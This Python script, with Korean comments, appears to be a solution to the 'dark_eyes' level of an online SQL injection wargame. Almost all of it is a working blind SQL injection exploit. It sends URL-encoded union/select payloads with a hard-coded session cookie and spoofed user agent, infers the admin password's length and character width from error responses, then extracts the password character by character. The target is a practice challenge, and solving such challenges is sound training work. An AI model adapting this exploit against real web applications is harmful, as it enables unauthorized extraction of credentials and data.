# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
session_id = "PHPSESSID="+"5u84grpvs4dd5tsgg6st4q4kse"

url_start = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"+'?'
pw_len = 0
word_len = 0

while 1:
    pw_len += 1
    url_len = url_start + "pw=%27||id=0x61646d696e%26%26(select%201%20union%20select%20length(pw)={})%23".format(str(pw_len))


    req_len = urllib.request.Request(url_len)  # 엔터 치기전 상태
    req_len.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
    req_len.add_header("Cookie", session_id)

    res_len = urllib.request.urlopen(req_len)  # 엔터누른 효과
    data_len = res_len.read().decode('utf-8')  # 본문만 가져오기


    if data_len.find("<hr>query : ") != -1:
        print('비밀번호 크기 : {}'.format(str(pw_len)))
        break

while 1:
    word_len += 1
    url_word = url_start + "pw=%27||id=0x61646d696e%26%26(select%201%20union%20select%20length(mid(pw,1,1))={})%23".format(str(word_len))


    req_word = urllib.request.Request(url_word)  # 엔터 치기전 상태
    req_word.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
    req_word.add_header("Cookie", session_id)

    res_word = urllib.request.urlopen(req_word)  # 엔터누른 효과
    data_word = res_word.read().decode('utf-8')  # 본문만 가져오기


    if data_word.find("<hr>query : ") != -1:
        print('1단어 크기 : {}'.format(str(word_len)))
        break

password_length = int(pw_len/word_len)
print('비밀번호 글자 수 : {}'.format(password_length))

for i in range(1, password_length+1):
    for j in range(32, 127):

        url_pw = url_start+"pw=%27||id=0x61646d696e%26%26(select%201%20union%20select%20ord(mid(pw,{},1))={})%23".format(str(i), str(j))

        print(url_pw)

        req_pw = urllib.request.Request(url_pw)  # 엔터 치기전 상태
        req_pw.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
        req_pw.add_header("Cookie", session_id)

        res_pw = urllib.request.urlopen(req_pw)  # 엔터누른 효과
        data_pw = res_pw.read().decode('utf-8')  # 본문만 가져오기

        if data_pw.find("<hr>query : ") != -1:
            print("%c" % (chr(j)))
            answer += chr(j)
            break
print(answer)


